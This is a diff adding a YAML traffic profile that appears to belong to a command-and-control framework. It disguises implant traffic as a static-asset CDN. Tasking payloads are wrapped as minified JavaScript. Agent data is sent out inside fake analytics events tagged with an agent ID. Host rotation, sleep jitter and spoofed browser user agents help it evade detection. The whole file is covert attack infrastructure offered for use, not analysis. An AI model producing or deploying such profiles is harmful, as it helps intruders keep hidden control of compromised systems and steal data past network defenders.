@@ -1,0 +1,73 @@
+# generic-cdn.yaml — Generic static asset CDN
+# GET requests fetch "static files" (.js, .css, .woff2, .png).
+# POST requests submit "analytics" data.
+# Content-Type varies by URI extension for realistic responses.
+
+name: generic-cdn
+description: Static asset CDN with analytics endpoint
+
+http-get:
+  uri:
+    - /static/js/app.2f8a9c1e.js
+    - /static/js/runtime.7b3d0e4a.js
+    - /static/js/chunk-vendors.5c9f1d3b.js
+    - /static/css/main.a4e2c8f1.css
+    - /static/fonts/inter-v12-latin.woff2
+    - /static/img/logo.f3a7b2d1.png
+  headers:
+    Host: cdn.example-app.com
+    Accept: "*/*"
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: en-US,en;q=0.9
+    Referer: "https://app.example-app.com/"
+    Cache-Control: public, max-age=31536000, immutable
+    ETag: '"{{RAND}}"'
+    X-Content-Type-Options: nosniff
+    X-Cache: HIT
+    X-Cache-Hits: "37"
+    Age: "14523"
+    Vary: Accept-Encoding
+  body:
+    # Payload disguised as minified JS module
+    prepend: '!function(e,t){"use strict";var n="'
+    append: '";e.exports=n}(window,document);'
+    transform: base64
+
+http-post:
+  uri:
+    - /api/analytics/collect
+    - /api/v1/events
+    - /api/rum/ingest
+  headers:
+    Host: cdn.example-app.com
+    Content-Type: application/json
+    Accept: application/json
+    Accept-Encoding: gzip, deflate, br
+    Origin: "https://app.example-app.com"
+    X-Request-Id: "{{RAND}}"
+    X-Correlation-Id: "{{RAND}}"
+  body:
+    # Payload wrapped as a RUM (Real User Monitoring) event
+    prepend: '{"v":2,"pid":"{{AGENT_ID}}","sid":"{{RAND}}","events":[{"name":"performance","ts":1719849600,"attrs":{"page":"/dashboard","data":"'
+    append: '"}}],"meta":{"ua":"Chrome/126","os":"Win10","screen":"1920x1080"}}'
+    transform: base64
+
+https-certificate:
+  CN: "*.example-app.com"
+  O: "Example App Inc."
+
+host-rotation:
+  strategy: round-robin
+  hosts:
+    - cdn1.example-app.com
+    - cdn2.example-app.com
+    - cdn3.example-app.com
+
+sleep:
+  default: 30
+  jitter: 35
+
+user-agent:
+  - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+  - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
+  - "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
